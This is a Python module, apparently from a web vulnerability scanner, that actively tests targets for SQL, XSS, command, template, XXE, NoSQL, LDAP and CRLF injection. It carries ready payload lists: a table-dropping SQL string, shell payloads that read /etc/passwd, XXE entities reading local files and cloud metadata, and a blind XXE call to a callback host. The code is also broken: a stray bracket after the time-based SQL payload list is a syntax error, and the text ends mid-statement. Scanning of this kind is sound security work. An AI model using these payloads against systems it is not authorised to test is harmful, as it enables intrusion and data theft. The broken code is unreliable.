"""
A03 - Injection Detector
=========================
Detects:
- SQL Injection (Error-based, Boolean-based, Time-based blind)
- Cross-Site Scripting (XSS) - Reflected & Stored
- Command Injection (OS Command)
- Server-Side Template Injection (SSTI)
- XML External Entity (XXE) Injection
- LDAP Injection
- NoSQL Injection (MongoDB)
- HTML Injection
- CRLF Injection / HTTP Header Injection

OWASP A03:2021 - Injection
CWE References: CWE-89, CWE-79, CWE-78, CWE-94, CWE-611, CWE-90, CWE-943, CWE-74
"""
from __future__ import annotations

import asyncio
import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, urlencode, parse_qsl, quote

import httpx

from ..core import (
    AssetInfo, BaseDetector, Finding, FindingBuilder,
    SeverityLevel, ConfidenceLevel, HTTPRequest, HTTPResponse
)


# ─── SQL Injection Payloads ───────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' AND '1'='2",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1 OR 1=1",
    "' OR 'x'='x",
    "\\",
]

SQLI_TIME_PAYLOADS = [
    ("'; WAITFOR DELAY '0:0:2'--", 2),       # MSSQL
    ("' AND SLEEP(2)--", 2),                  # MySQL
    ("'; SELECT pg_sleep(2)--", 2),           # PostgreSQL
]
]

SQLI_BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("true", "false"),
]

# SQL error patterns in response bodies
SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning:\s*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\): query failed",
    r"odbc sql server driver",
    r"syntax error at or near",
    r"microsoft ole db provider for sql server",
    r"ora-\d+:",
    r"oracle.*error",
    r"db2 sql error",
    r"dynamic sql error",
    r"invalid use of null",
    r"sqlstate=",
    r"pdo.*exception",
    r"java\.sql\.sqlexception",
    r"org\.postgresql\.util\.psqlexception",
    r"com\.mysql\.jdbc\.exceptions",
    r"sqlite.*error",
    r"sqlalchemy.*error",
    r"django.db.utils",
]


# ─── XSS Payloads ─────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<body onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    'javascript:alert(1)',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '"><a href="javascript:alert(1)">XSS</a>',
    '<details open ontoggle=alert(1)>',
    '${alert(1)}',                      # Template injection
    '{{7*7}}',                           # SSTI probe
    '#{7*7}',                            # SSTI Ruby
    'expression(alert(1))',              # CSS expression (IE)
]

XSS_SUCCESS_PATTERNS = [
    r'<script>alert\(["\']?XSS["\']?\)</script>',
    r'<script>alert\(1\)</script>',
    r'<img\s+src=x\s+onerror=alert\(1\)>',
    r'<svg\s+onload=alert\(1\)>',
    r'onerror=alert\(1\)',
    r'onload=alert\(1\)',
]


# ─── Command Injection Payloads ───────────────────────────────────────────────

CMD_PAYLOADS = [
    ("; id", r"\buid=\d+\(\w+\)\s+gid=\d+"),
    ("| id", r"\buid=\d+\(\w+\)\s+gid=\d+"),
    ("&& id", r"\buid=\d+\(\w+\)\s+gid=\d+"),
    ("; whoami", r"^(root|www-data|apache|nginx|nobody|daemon)\s*$"),
    ("| whoami", r"^(root|www-data|apache|nginx|nobody|daemon)\s*$"),
    ("`id`", r"\buid=\d+"),
    ("$(id)", r"\buid=\d+"),
    ("; cat /etc/passwd", r"root:[x*]:0:0"),
    ("| cat /etc/passwd", r"root:[x*]:0:0"),
    ("; sleep 5", None),  # Time-based
    ("| sleep 5", None),  # Time-based
    ("& sleep 5 &", None),  # Time-based
    ("; ping -c 5 127.0.0.1", None),  # Time-based
]


# ─── SSTI Payloads ────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),          # Jinja2 / Twig / Pebble
    ("${7*7}", "49"),           # Freemarker / Spring EL
    ("#{7*7}", "49"),           # Thymeleaf / Ruby ERB
    ("<%= 7*7 %>", "49"),       # ERB / EJS
    ("{{7*'7'}}", "7777777"),   # Jinja2 (string multiplication)
    ("{{config}}", r"<Config\s"),  # Django / Jinja2 config leak
    ("*{7*7}", "49"),           # Spring EL
    ("@{7*7}", "49"),           # Thymeleaf
    ("${\"freemarker.template\".API.class.forName(\"java.lang.Runtime\")}", "class java.lang.Runtime"),
]


# ─── XXE Payloads ─────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        r"root:[x*]:0:0"
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
        r"[a-zA-Z0-9\-]{2,}"
    ),
    (
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>',
        r"169\.254\.169\.254|meta-data"
    ),
    (
        '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        r"root:[x*]:0:0"
    ),
]

XXE_BLIND_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{callback}/xxe">]><foo>&xxe;</foo>'


# ─── NoSQL Injection Payloads ─────────────────────────────────────────────────

NOSQL_PAYLOADS = [
    # MongoDB operator injection
    ('{"$gt": ""}', r'"_id":|"username":|"email":'),
    ('{"$ne": null}', r'"_id":|"username":|"email":'),
    ('{"$regex": ".*"}', r'"_id":|"username":'),
    ('{"username": {"$gt": ""}, "password": {"$gt": ""}}', r'token|dashboard|welcome'),
    # URL parameter injection
    ("[$gt]", None),
    ("[$ne]", None),
    ('[%24gt]', None),
]


# ─── LDAP Injection Payloads ──────────────────────────────────────────────────

LDAP_PAYLOADS = [
    "*",
    "*)(&",
    "*)(uid=*))(|(uid=*",
    "*()|%26'",
    "admin*",
    "*(|(objectClass=*))",
    "*)((|userPassword=*",
]

LDAP_ERROR_PATTERNS = [
    r"ldap_bind",
    r"ldap error",
    r"invalid dn syntax",
    r"size limit exceeded",
    r"ldap_search",
    r"javax.naming.ldap",
    r"net.naming.ldap",
    r"Error in search operation",
]


# ─── CRLF Injection Payloads ──────────────────────────────────────────────────

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: true",
    "%0aSet-Cookie: injected=true",
    "\r\nX-Injected: true",
    "%0d%0a%0d%0aInjected-Body",
    "foo%0d%0aSet-Cookie:+session=hijacked",
]


# ─── Parameter injection helpers ──────────────────────────────────────────────

def _inject_param(url: str, param_name: str, value: str) -> str:
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    params[param_name] = value
    return parsed._replace(query=urlencode(params)).geturl()


def _build_form_data(inputs: List[Dict], field_name: str, value: str) -> Dict:
    data = {i['name']: i.get('value', '') for i in inputs if i.get('name')}
    data[field_name] = value
    return data


class InjectionDetector(BaseDetector):
    """
    A03:2021 - Injection Detector.

    Actively probes all injectable points for:
    - SQL Injection (error, boolean, time-based)
    - XSS (reflected)
    - Command Injection
    - SSTI
    - XXE
    - NoSQL Injection
    - LDAP Injection
    - CRLF Injection
    """
    owasp_category = "A03"
    name = "Injection"

    async def detect(self, assets: List[AssetInfo]) -> List[Finding]:
        self._log(f"Starting A03 (Injection) detection on {len(assets)} assets")

        tasks = []

        # Per-asset injection checks
        for asset in assets:
            # URL parameter injection
            if asset.params:
                for param_name in list(asset.params.keys())[:10]:
                    tasks.append(self._test_sqli_param(asset, param_name))
                    tasks.append(self._test_xss_param(asset, param_name))
                    tasks.append(self._test_cmd_injection_param(asset, param_name))
                    tasks.append(self._test_ssti_param(asset, param_name))
                    tasks.append(self._test_ldap_param(asset, param_name))
                    tasks.append(self._test_crlf_param(asset, param_name))

            # Form injection
            for form in (asset.forms or []):
                for inp in form.get('inputs', []):
                    if inp.get('type') in ('hidden', 'submit', 'button'):
                        continue
                    inp_name = inp.get('name', '')
                    if not inp_name:
                        continue
                    tasks.append(self._test_sqli_form(form, inp_name, asset.url))
                    tasks.append(self._test_xss_form(form, inp_name, asset.url))

        # Target-level XXE checks
        tasks.append(self._test_xxe())

        # NoSQL checks on API endpoints
        api_assets = [a for a in assets if a.asset_type == 'API']
        for api in api_assets[:10]:
            tasks.append(self._test_nosql_api(api))

        await asyncio.gather(*tasks, return_exceptions=True)
        self._log(f"A03 detection complete. Found {len(self._findings)} issues.")
        return self._findings

    # ─── SQL Injection ────────────────────────────────────────────────────────

    async def _test_sqli_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test a URL parameter for SQL injection."""
        # --- Error-based ---
        for payload in SQLI_ERROR_PAYLOADS:
            test_url = _inject_param(asset.url, param_name, payload)
            resp, elapsed = await self._request('GET', test_url)
            if resp is None:
                continue
            body = resp.text.lower()
            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self._add_finding(
                        FindingBuilder()
                        .name(f"SQL Injection (Error-Based) in Parameter '{param_name}'")
                        .category("A03")
                        .vuln_type("SQL Injection")
                        .severity(SeverityLevel.CRITICAL)
                        .confidence(ConfidenceLevel.HIGH)
                        .url(test_url)
                        .param(param_name)
                        .cwe("CWE-89")
                        .capec("CAPEC-66")
                        .description(
                            f"SQL injection confirmed via error-based technique in parameter '{param_name}'. "
                            f"The payload '{payload}' triggered a database error in the response."
                        )
                        .risk(
                            "SQL injection allows attackers to read, modify, and delete database records. "
                            "It can lead to authentication bypass, data exfiltration, and RCE via stacked queries."
                        )
                        .impact(
                            "Full database compromise: read all data, bypass authentication, "
                            "modify or delete records, OS-level command execution via xp_cmdshell or INTO OUTFILE."
                        )
                        .remediation(
                            "1. Use parameterized queries / prepared statements exclusively.\n"
                            "2. Never concatenate user input into SQL strings.\n"
                            "3. Use an ORM with proper parameter binding.\n"
                            "4. Apply input validation (allowlist of expected characters).\n"
                            "5. Disable detailed database error messages in production."
                        )
                        .add_ref("https://owasp.org/www-community/attacks/SQL_Injection")
                        .add_ref("https://portswigger.net/web-security/sql-injection")
                        .evidence(f"Database error pattern '{pattern}' found in response")
                        .proof(f"GET {test_url}\nResponse contains SQL error: {body[:300]}")
                        .request(self._build_request_obj('GET', test_url))
                        .response(self._build_response_obj(resp, elapsed))
                        .detected_by("A03_SQLI_ERROR")
                        .build()
                    )
                    return

        # --- Time-based blind ---
        await self._test_sqli_time_based(asset, param_name, 'GET')

    async def _test_sqli_time_based(
        self, asset: AssetInfo, param_name: str, method: str,
        form_action: Optional[str] = None, inputs: Optional[List] = None
    ) -> None:
        """Time-based blind SQL injection test."""
        timing_threshold = float(
            self.config.get('detection', {}).get('timing_threshold_ms', 4000)
        ) / 1000  # Convert ms to seconds

        for payload, sleep_seconds in SQLI_TIME_PAYLOADS:
            # Baseline timing
            if form_action and inputs:
                data = {i['name']: i.get('value', '') for i in inputs if i.get('name')}
                data[param_name] = 'normal_value'
                t0 = time.monotonic()
                await self._request(method, form_action, data=data)
                baseline_elapsed = time.monotonic() - t0

                data[param_name] = payload
                t0 = time.monotonic()
                resp, _ = await self._request(method, form_action, data=data)
                actual_elapsed = time.monotonic() - t0
            else:
                normal_url = _inject_param(asset.url, param_name, 'normalvalue')
                t0 = time.monotonic()
                await self._request('GET', normal_url)
                baseline_elapsed = time.monotonic() - t0

                test_url = _inject_param(asset.url, param_name, payload)
                t0 = time.monotonic()
                resp, _ = await self._request('GET', test_url)
                actual_elapsed = time.monotonic() - t0

            delay = actual_elapsed - baseline_elapsed
            if delay >= (sleep_seconds - 1):  # Allow 1 second tolerance
                target_url = form_action or asset.url
                self._add_finding(
                    FindingBuilder()
                    .name(f"Blind SQL Injection (Time-Based) in '{param_name}'")
                    .category("A03")
                    .vuln_type("Blind SQL Injection")
                    .severity(SeverityLevel.CRITICAL)
                    .confidence(ConfidenceLevel.HIGH)
                    .url(target_url)
                    .param(param_name)
                    .cwe("CWE-89")
                    .capec("CAPEC-66")
                    .description(
                        f"Time-based blind SQL injection in parameter '{param_name}'. "
                        f"The payload '{payload}' caused a {delay:.1f}s delay (expected {sleep_seconds}s). "
                        "This confirms the database evaluated the injected sleep function."
                    )
                    .risk("Blind SQLi allows data extraction character by character even without visible errors.")
                    .impact("Database exfiltration, authentication bypass, potential OS command execution.")
                    .remediation(
                        "1. Use parameterized queries / prepared statements.\n"
                        "2. Apply strict input validation.\n"
                        "3. Use stored procedures with proper parameter handling.\n"
                        "4. Implement WAF rules for time-delay patterns."
                    )
                    .add_ref("https://portswigger.net/web-security/sql-injection/blind")
                    .evidence(f"Response delayed {delay:.2f}s with payload '{payload}'")
                    .proof(f"Normal response: {baseline_elapsed:.2f}s | Injected: {actual_elapsed:.2f}s")
                    .detected_by("A03_SQLI_TIME")
                    .build()
                )
                return

    async def _test_sqli_form(self, form: Dict, field_name: str, base_url: str) -> None:
        """Test a form field for SQL injection."""
        action = form.get('action', base_url)
        method = form.get('method', 'POST').upper()
        inputs = form.get('inputs', [])

        for payload in SQLI_ERROR_PAYLOADS[:7]:
            data = _build_form_data(inputs, field_name, payload)
            resp, elapsed = await self._request(method, action, data=data)
            if resp is None:
                continue
            body = resp.text.lower()
            for pattern in SQLI_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self._add_finding(
                        FindingBuilder()
                        .name(f"SQL Injection (Error-Based) in Form Field '{field_name}'")
                        .category("A03")
                        .vuln_type("SQL Injection")
                        .severity(SeverityLevel.CRITICAL)
                        .confidence(ConfidenceLevel.HIGH)
                        .url(action)
                        .param(field_name)
                        .cwe("CWE-89")
                        .capec("CAPEC-66")
                        .description(
                            f"SQL injection confirmed in form field '{field_name}' at {action}. "
                            f"Payload '{payload}' triggered a database error."
                        )
                        .risk("Full database compromise possible via SQL injection.")
                        .impact("Data exfiltration, authentication bypass, data manipulation.")
                        .remediation(
                            "1. Use parameterized queries for all database operations.\n"
                            "2. Validate and sanitize all form inputs.\n"
                            "3. Disable detailed error messages in production."
                        )
                        .add_ref("https://owasp.org/www-community/attacks/SQL_Injection")
                        .evidence(f"SQL error pattern found: '{pattern}'")
                        .proof(f"{method} {action} with {field_name}={payload} returned DB error")
                        .detected_by("A03_SQLI_FORM")
                        .build()
                    )
                    return

    # ─── XSS ─────────────────────────────────────────────────────────────────

    async def _test_xss_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test a URL parameter for reflected XSS."""
        for payload in XSS_PAYLOADS[:8]:
            test_url = _inject_param(asset.url, param_name, payload)
            resp, elapsed = await self._request('GET', test_url)
            if resp is None:
                continue

            ct = resp.headers.get('content-type', '').lower()
            if 'text/html' not in ct and 'text/plain' not in ct:
                continue

            body = resp.text
            # Check if the exact payload is reflected in the response (unescaped)
            if payload in body or payload.lower() in body.lower():
                # Verify it's not inside a comment or escaped
                if re.search(r'<(?:script|img|svg|iframe|input|body|details|a\s)', body, re.IGNORECASE):
                    self._add_finding(
                        FindingBuilder()
                        .name(f"Reflected Cross-Site Scripting (XSS) in Parameter '{param_name}'")
                        .category("A03")
                        .vuln_type("Cross-Site Scripting (XSS)")
                        .severity(SeverityLevel.HIGH)
                        .confidence(ConfidenceLevel.HIGH)
                        .url(test_url)
                        .param(param_name)
                        .cwe("CWE-79")
                        .capec("CAPEC-86")
                        .description(
                            f"Reflected XSS confirmed in parameter '{param_name}'. "
                            f"The payload '{payload[:80]}' was returned unescaped in the HTML response."
                        )
                        .risk(
                            "XSS allows attackers to execute arbitrary JavaScript in victims' browsers. "
                            "Can be used for session hijacking, credential theft, and defacement."
                        )
                        .impact(
                            "Session cookie theft, credential harvesting via fake forms, "
                            "malware distribution, UI redressing, and full browser compromise."
                        )
                        .remediation(
                            "1. HTML-encode all user-supplied data before rendering.\n"
                            "2. Implement Content Security Policy (CSP) header.\n"
                            "3. Use a template engine that auto-escapes by default.\n"
                            "4. Validate input type and length strictly.\n"
                            "5. Use HTTPOnly and Secure cookie flags."
                        )
                        .add_ref("https://owasp.org/www-community/attacks/xss/")
                        .add_ref("https://portswigger.net/web-security/cross-site-scripting")
                        .evidence(f"Payload reflected verbatim in response: {payload[:100]}")
                        .proof(f"GET {test_url}\nPayload '{payload}' found in response body")
                        .request(self._build_request_obj('GET', test_url))
                        .response(self._build_response_obj(resp, elapsed))
                        .detected_by("A03_XSS_REFLECTED")
                        .build()
                    )
                    return

    async def _test_xss_form(self, form: Dict, field_name: str, base_url: str) -> None:
        """Test a form field for XSS."""
        action = form.get('action', base_url)
        method = form.get('method', 'POST').upper()
        inputs = form.get('inputs', [])

        for payload in XSS_PAYLOADS[:5]:
            data = _build_form_data(inputs, field_name, payload)
            resp, elapsed = await self._request(method, action, data=data)
            if resp is None:
                continue

            ct = resp.headers.get('content-type', '').lower()
            if 'text/html' not in ct:
                continue

            body = resp.text
            if payload in body:
                self._add_finding(
                    FindingBuilder()
                    .name(f"Reflected XSS via Form Field '{field_name}'")
                    .category("A03")
                    .vuln_type("Cross-Site Scripting (XSS)")
                    .severity(SeverityLevel.HIGH)
                    .confidence(ConfidenceLevel.HIGH)
                    .url(action)
                    .param(field_name)
                    .cwe("CWE-79")
                    .capec("CAPEC-86")
                    .description(
                        f"Reflected XSS confirmed via form field '{field_name}' at {action}. "
                        f"The XSS payload was reflected unescaped in the response."
                    )
                    .risk("Enables session hijacking, credential theft, and user account compromise.")
                    .impact("Session theft, malware execution in user browsers.")
                    .remediation(
                        "1. HTML-escape all output from form fields.\n"
                        "2. Implement strict Content Security Policy.\n"
                        "3. Use framework-level output encoding."
                    )
                    .add_ref("https://owasp.org/www-community/attacks/xss/")
                    .evidence(f"XSS payload '{payload[:80]}' reflected in form response")
                    .detected_by("A03_XSS_FORM")
                    .build()
                )
                return

    # ─── Command Injection ────────────────────────────────────────────────────

    async def _test_cmd_injection_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test a URL parameter for OS command injection."""
        # Only test params that commonly handle system commands or file ops
        cmd_param_pattern = re.compile(
            r'\b(cmd|command|exec|execute|run|ping|host|ip|domain|query|'
            r'file|path|dir|folder|log|name|input|query|search|sort)\b',
            re.IGNORECASE
        )
        if not cmd_param_pattern.search(param_name):
            return

        for payload, success_pattern in CMD_PAYLOADS[:8]:
            test_url = _inject_param(asset.url, param_name, payload)
            t0 = time.monotonic()
            resp, elapsed = await self._request('GET', test_url)
            actual_elapsed = time.monotonic() - t0

            if resp is None:
                continue

            body = resp.text

            if success_pattern and re.search(success_pattern, body, re.MULTILINE | re.IGNORECASE):
                self._add_finding(
                    FindingBuilder()
                    .name(f"OS Command Injection in Parameter '{param_name}'")
                    .category("A03")
                    .vuln_type("Command Injection")
                    .severity(SeverityLevel.CRITICAL)
                    .confidence(ConfidenceLevel.CERTAIN)
                    .url(test_url)
                    .param(param_name)
                    .cwe("CWE-78")
                    .capec("CAPEC-88")
                    .description(
                        f"OS command injection confirmed in parameter '{param_name}'. "
                        f"The payload '{payload}' caused the server to execute a system command "
                        f"and return its output in the HTTP response."
                    )
                    .risk(
                        "Command injection allows attackers to run arbitrary OS commands on the server, "
                        "leading to full server compromise."
                    )
                    .impact(
                        "Full server compromise: read files, execute binaries, pivot to internal network, "
                        "establish persistent backdoors, exfiltrate all data."
                    )
                    .remediation(
                        "1. Never pass user input to OS command execution functions.\n"
                        "2. Use safe APIs instead of shell commands (e.g., Python's subprocess with array args).\n"
                        "3. Apply strict input validation with allowlist of permitted characters.\n"
                        "4. Run the application with minimum required OS privileges.\n"
                        "5. Use chroot jails or containers to limit blast radius."
                    )
                    .add_ref("https://owasp.org/www-community/attacks/Command_Injection")
                    .add_ref("https://portswigger.net/web-security/os-command-injection")
                    .evidence(f"System command output pattern '{success_pattern}' found in response")
                    .proof(f"GET {test_url}\nResponse contains command output: {body[:200]}")
                    .request(self._build_request_obj('GET', test_url))
                    .response(self._build_response_obj(resp, elapsed))
                    .detected_by("A03_CMD_INJECTION")
                    .build()
                )
                return
            # Time-based detection (sleep payload)
            elif success_pattern is None and actual_elapsed >= 4.5:
                self._add_finding(
                    FindingBuilder()
                    .name(f"Blind OS Command Injection (Time-Based) in '{param_name}'")
                    .category("A03")
                    .vuln_type("Command Injection")
                    .severity(SeverityLevel.CRITICAL)
                    .confidence(ConfidenceLevel.MEDIUM)
                    .url(test_url)
                    .param(param_name)
                    .cwe("CWE-78")
                    .description(
                        f"Possible blind command injection in '{param_name}'. "
                        f"Sleep payload caused {actual_elapsed:.1f}s response delay."
                    )
                    .risk("Blind command injection can be used to fully compromise the server.")
                    .remediation(
                        "1. Never use user-controlled input in OS command calls.\n"
                        "2. Validate and sanitize all inputs strictly."
                    )
                    .evidence(f"Response delayed {actual_elapsed:.2f}s with sleep payload '{payload}'")
                    .detected_by("A03_CMD_BLIND")
                    .build()
                )
                return

    # ─── SSTI ─────────────────────────────────────────────────────────────────

    async def _test_ssti_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test a parameter for Server-Side Template Injection."""
        for payload, expected in SSTI_PAYLOADS:
            test_url = _inject_param(asset.url, param_name, payload)
            resp, elapsed = await self._request('GET', test_url)
            if resp is None:
                continue

            body = resp.text
            if re.search(expected, body):
                self._add_finding(
                    FindingBuilder()
                    .name(f"Server-Side Template Injection (SSTI) in Parameter '{param_name}'")
                    .category("A03")
                    .vuln_type("Server-Side Template Injection")
                    .severity(SeverityLevel.CRITICAL)
                    .confidence(ConfidenceLevel.HIGH)
                    .url(test_url)
                    .param(param_name)
                    .cwe("CWE-94")
                    .capec("CAPEC-242")
                    .description(
                        f"SSTI confirmed in parameter '{param_name}'. "
                        f"Template expression '{payload}' was evaluated server-side and returned '{expected}'. "
                        "SSTI allows code execution in the template engine's context."
                    )
                    .risk(
                        "SSTI is often exploitable for Remote Code Execution. "
                        "Attackers can traverse object hierarchies to reach OS-level execution."
                    )
                    .impact(
                        "Remote code execution on the server, full application compromise, "
                        "data exfiltration, and lateral movement."
                    )
                    .remediation(
                        "1. Never pass user-controlled input to template rendering functions.\n"
                        "2. Use sandboxed template engines.\n"
                        "3. Escape template-special characters before rendering.\n"
                        "4. Consider using logic-less templates (Mustache, etc.).\n"
                        "5. Apply output encoding appropriate to the template engine."
                    )
                    .add_ref("https://portswigger.net/web-security/server-side-template-injection")
                    .add_ref("https://owasp.org/www-community/attacks/Server_Side_Template_Injection")
                    .evidence(f"Template expression '{payload}' evaluated to match '{expected}'")
                    .proof(f"GET {test_url}\nBody contains evaluated template result: {body[:300]}")
                    .request(self._build_request_obj('GET', test_url))
                    .response(self._build_response_obj(resp, elapsed))
                    .detected_by("A03_SSTI")
                    .build()
                )
                return

    # ─── XXE ─────────────────────────────────────────────────────────────────

    async def _test_xxe(self) -> None:
        """Test for XXE on XML-accepting endpoints."""
        # Test the target for XML endpoints
        xml_paths = ['/api/', '/api/v1/', '/api/v2/', '/soap/', '/xmlrpc.php',
                     '/ws/', '/service/', '/services/', '/api/xml', '/upload']

        # Also check content-type on the main target
        targets = [self.target.url] + [urljoin(self.target.url, p) for p in xml_paths[:5]]

        for target_url in targets:
            for xxe_payload, success_pattern in XXE_PAYLOADS[:2]:
                resp, elapsed = await self._request(
                    'POST', target_url,
                    content=xxe_payload,
                    headers={
                        'Content-Type': 'application/xml',
                        'Accept': 'application/xml, text/xml'
                    }
                )
                if resp is None or resp.status_code not in (200, 201, 400, 500):
                    continue

                body = resp.text
                if re.search(success_pattern, body):
                    self._add_finding(
                        FindingBuilder()
                        .name("XML External Entity (XXE) Injection")
                        .category("A03")
                        .vuln_type("XXE Injection")
                        .severity(SeverityLevel.CRITICAL)
                        .confidence(ConfidenceLevel.HIGH)
                        .url(target_url)
                        .cwe("CWE-611")
                        .capec("CAPEC-221")
                        .description(
                            f"XXE injection confirmed at {target_url}. "
                            "The server parsed an external entity reference and returned "
                            "the contents of an internal file (/etc/passwd)."
                        )
                        .risk(
                            "XXE allows reading local files, SSRF to internal services, "
                            "denial of service via Billion Laughs attack, and potentially RCE."
                        )
                        .impact(
                            "Read sensitive files (/etc/passwd, application configs, SSH keys), "
                            "SSRF to cloud metadata APIs, internal port scanning."
                        )
                        .remediation(
                            "1. Disable XML external entity processing in your XML parser.\n"
                            "2. Use XML_FEATURE_DISALLOW_DOCTYPE_DECL or equivalent.\n"
                            "3. Consider using JSON instead of XML.\n"
                            "4. Validate and sanitize all XML input.\n"
                            "5. Use a WAF rule to block DOCTYPE declarations."
                        )
                        .add_ref("https://portswigger.net/web-security/xxe")
                        .add_ref("https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing")
                        .evidence(f"XXE payload triggered: /etc/passwd content returned in response")
                        .proof(f"POST {target_url} with XXE payload returned: {body[:300]}")
                        .request(self._build_request_obj('POST', target_url, body=xxe_payload))
                        .response(self._build_response_obj(resp, elapsed))
                        .detected_by("A03_XXE")
                        .build()
                    )
                    return

    # ─── NoSQL Injection ─────────────────────────────────────────────────────

    async def _test_nosql_api(self, asset: AssetInfo) -> None:
        """Test an API endpoint for NoSQL injection."""
        # Try JSON body injection
        for payload_str, success_pattern in NOSQL_PAYLOADS[:4]:
            try:
                import json as _json
                payload = _json.loads(payload_str)
            except Exception:
                continue

            resp, elapsed = await self._request(
                'POST', asset.url,
                json=payload,
                headers={'Content-Type': 'application/json'}
            )
            if resp is None:
                continue

            if resp.status_code == 200 and success_pattern:
                if re.search(success_pattern, resp.text, re.IGNORECASE):
                    self._add_finding(
                        FindingBuilder()
                        .name(f"NoSQL Injection (MongoDB Operator) at {asset.url}")
                        .category("A03")
                        .vuln_type("NoSQL Injection")
                        .severity(SeverityLevel.CRITICAL)
                        .confidence(ConfidenceLevel.HIGH)
                        .url(asset.url)
                        .cwe("CWE-943")
                        .capec("CAPEC-676")
                        .description(
                            f"NoSQL injection confirmed at {asset.url}. "
                            f"MongoDB operator payload '{payload_str}' was accepted and "
                            "returned database records, indicating operator injection is possible."
                        )
                        .risk(
                            "NoSQL injection allows authentication bypass, data exfiltration, "
                            "and in some cases command execution."
                        )
                        .impact(
                            "Authentication bypass, full collection dump, "
                            "data manipulation, privilege escalation."
                        )
                        .remediation(
                            "1. Sanitize input by removing MongoDB operators ($gt, $ne, $regex, etc.).\n"
                            "2. Use schema validation to reject unexpected types (object instead of string).\n"
                            "3. Use parameterized queries with Mongoose or similar ODMs.\n"
                            "4. Validate and cast input types before database queries."
                        )
                        .add_ref("https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection")
                        .evidence(f"MongoDB operator payload accepted, response contains database objects")
                        .detected_by("A03_NOSQL_INJECTION")
                        .build()
                    )
                    return

    # ─── LDAP Injection ──────────────────────────────────────────────────────

    async def _test_ldap_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test a parameter for LDAP injection."""
        ldap_param_pattern = re.compile(
            r'\b(user|username|login|uid|cn|dn|search|filter|query|email|name|group)\b',
            re.IGNORECASE
        )
        if not ldap_param_pattern.search(param_name):
            return

        for payload in LDAP_PAYLOADS[:4]:
            test_url = _inject_param(asset.url, param_name, payload)
            resp, elapsed = await self._request('GET', test_url)
            if resp is None:
                continue

            body = resp.text.lower()
            for pattern in LDAP_ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self._add_finding(
                        FindingBuilder()
                        .name(f"LDAP Injection in Parameter '{param_name}'")
                        .category("A03")
                        .vuln_type("LDAP Injection")
                        .severity(SeverityLevel.HIGH)
                        .confidence(ConfidenceLevel.MEDIUM)
                        .url(test_url)
                        .param(param_name)
                        .cwe("CWE-90")
                        .capec("CAPEC-136")
                        .description(
                            f"LDAP injection detected in parameter '{param_name}'. "
                            f"The payload '{payload}' triggered an LDAP error in the response, "
                            "suggesting the input is being used in an LDAP query without sanitization."
                        )
                        .risk(
                            "LDAP injection can bypass authentication, "
                            "enumerate users/groups, and access unauthorized directory data."
                        )
                        .impact("Authentication bypass, LDAP directory enumeration, privilege escalation.")
                        .remediation(
                            "1. Escape special LDAP characters: ( ) * \\ NUL.\n"
                            "2. Use allowlist validation for LDAP input fields.\n"
                            "3. Use an LDAP library with built-in escaping.\n"
                            "4. Implement the principle of least privilege for the LDAP service account."
                        )
                        .add_ref("https://owasp.org/www-community/attacks/LDAP_Injection")
                        .evidence(f"LDAP error pattern '{pattern}' found in response")
                        .detected_by("A03_LDAP_INJECTION")
                        .build()
                    )
                    return

    # ─── CRLF Injection ──────────────────────────────────────────────────────

    async def _test_crlf_param(self, asset: AssetInfo, param_name: str) -> None:
        """Test for CRLF/HTTP header injection."""
        for payload in CRLF_PAYLOADS[:3]:
            test_url = _inject_param(asset.url, param_name, payload)
            resp, elapsed = await self._request('GET', test_url)
            if resp is None:
                continue

            # Check if our injected header appears in the response
            if 'x-injected' in {k.lower() for k in resp.headers}:
                self._add_finding(
                    FindingBuilder()
                    .name(f"CRLF / HTTP Header Injection in Parameter '{param_name}'")
                    .category("A03")
                    .vuln_type("CRLF Injection")
                    .severity(SeverityLevel.MEDIUM)
                    .confidence(ConfidenceLevel.HIGH)
                    .url(test_url)
                    .param(param_name)
                    .cwe("CWE-74")
                    .capec("CAPEC-105")
                    .description(
                        f"CRLF injection confirmed in parameter '{param_name}'. "
